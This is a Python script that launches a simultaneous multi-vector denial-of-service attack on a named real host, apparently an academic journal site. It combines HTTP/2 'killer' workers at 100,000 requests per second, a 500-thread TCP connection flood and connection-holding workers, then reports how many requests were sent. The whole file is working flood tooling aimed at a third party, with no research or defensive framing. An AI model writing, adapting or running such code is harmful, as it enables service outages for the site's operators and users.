"""Multi-vector: H2 Killer + TCP Flood + Connection Hold simultaneously."""
import sys, time, threading, queue, asyncio
sys.path.insert(0, '.')
from core.attack.engines.h2_killer_engine import run_killer_worker
from core.attack.engines.h2_hold_engine import run_hold_worker
from core.attack.engines.layer4_v5 import TcpConnectionFlood

target = 'ojs.phb.ac.id'
duration = 30

stop = threading.Event()
stats_q = queue.Queue()
threads = []
results = []

# 1. H2 Killer workers (8 workers x 4 connections = 32 h2 streams)
print('[+] Launching H2 Killer workers...')
for wi in range(8):
    r = {}
    results.append(r)
    t = threading.Thread(
        target=run_killer_worker,
        kwargs=dict(
            target_url=f'https://{target}/', rps=100000,
            duration=duration, worker_id=100 + wi,
            stats_queue=stats_q, stop_event=stop,
            host_header=target, connections=4,
            result_dict=r,
        ),
        daemon=True,
    )
    t.start()
    threads.append(t)

# 2. TCP connection flood (async, runs in main event loop)
print('[+] Launching TCP Connection Flood...')
tcp_flood = TcpConnectionFlood()

# 3. Connection hold
print('[+] Launching Connection Hold...')
for wi in range(3):
    t = threading.Thread(
        target=run_hold_worker,
        kwargs=dict(
            target_url=f'https://{target}/', duration=duration,
            worker_id=200 + wi, stats_queue=queue.Queue(),
            stop_event=stop, host_header=target, connections=50,
        ),
        daemon=True,
    )
    t.start()
    threads.append(t)

# Run TCP flood in asyncio
async def run_all():
    tcp_task = asyncio.create_task(tcp_flood.attack(
        target=f'https://{target}/', duration=duration, threads=500
    ))
    
    # Monitor progress
    start = time.time()
    try:
        while time.time() - start < duration:
            await asyncio.sleep(1)
            remaining = duration - (time.time() - start)
            # Print H2 killer stats
            h2_sent = sum(r.get('sent', 0) for r in results)
            print(f'  [{int(remaining)}s] H2 killer sent={h2_sent}')
            if remaining <= 0:
                break
    except:
        pass
    
    stop.set()
    tcp_result = await tcp_task
    
    for t in threads:
        t.join(timeout=3)
    
    h2_total = sum(r.get('sent', 0) for r in results)
    h2_fails = sum(r.get('failed', 0) for r in results)
    tcp_sent = tcp_result.get('sent', 0)
    tcp_fails = tcp_result.get('failed', 0)
    
    print(f'\n=== RESULTS ===')
    print(f'H2 Killer: sent={h2_total}, failed={h2_fails}')
    print(f'TCP Flood: sent={tcp_sent}, failed={tcp_fails}')
    print(f'Total sent: {h2_total + tcp_sent}')

asyncio.run(run_all())
